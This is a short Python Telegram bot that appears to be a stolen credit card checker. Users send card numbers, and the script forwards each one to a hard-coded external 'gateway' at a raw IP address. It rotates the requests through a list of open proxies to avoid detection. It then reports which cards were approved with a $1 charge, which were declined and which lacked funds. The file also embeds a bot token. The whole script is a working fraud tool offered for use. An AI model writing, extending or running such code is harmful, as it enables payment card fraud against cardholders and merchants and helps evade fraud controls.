from telebot import TeleBot
import requests

bot = TeleBot("8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE")

GATEWAY = "http://138.128.240.15:8024/paypal_1?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Updated Logic ON**")

@bot.message_handler(func=lambda m: True)
def checker(m):
    for line in m.text.splitlines():
        line = line.strip()
        if not line: continue

        proxy = get_proxy()
        try:
            url = GATEWAY + line.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            if "ORDER NOT APPROVED" in resp or '"status":"DECLINED"' in resp or "DECLINED" in resp:
                bot.reply_to(m, f"❌ **Card was got declined**\n{line}")

            elif any(x in resp for x in ["ORDER APPROVED", "charged", "charge", "success", "APPROVED"]):
                bot.reply_to(m, f"✅ **1$ Charged - Card Approved**\n{line}")

            elif "insufficient" in resp.lower() or "funds" in resp.lower():
                bot.reply_to(m, f"⚠️ **Insufficient Funds**\n{line}")

            else:
                bot.reply_to(m, f"❓ **Unknown Response**\n{line}\n{resp[:200]}")

        except Exception as e:
            bot.reply_to(m, f"❌ Error on {line}")

bot.infinity_polling()
